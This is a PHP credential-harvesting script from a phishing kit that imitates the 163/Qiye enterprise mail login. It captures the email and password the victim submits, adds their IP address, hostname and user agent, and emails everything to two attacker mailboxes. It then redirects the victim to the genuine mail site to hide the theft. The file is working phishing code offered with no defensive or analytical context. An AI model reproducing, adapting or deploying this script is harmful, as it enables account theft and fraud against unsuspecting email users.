<?php
if($_POST["email"] != "" and $_POST["password"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "|----------| PAPAZ & SON |--------------|\n";
$message .= "Online ID            : ".$_POST['email']."\n";
$message .= "Password              : ".$_POST['password']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- INFO CONT. --------------|\n";
$message .= 	"IP: {$geoplugin->ip}\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= 	"User-Agent: ".$browser."\n";
$message.= "Date Log  : ".$date."\n";
$message.= "Time Log  : ".$time."\n";
$send = "ijazzy2@protonmail.com,ijazzy@yandex.com";
$domain = 'qiye163';
$subject = "qiye163";
$from = "From: $domain<west>\n";
{
mail("$send", "$subject", $message, $from, $domain);   
}
  header ("Location: http://mail.qiye.163.com");
}
?>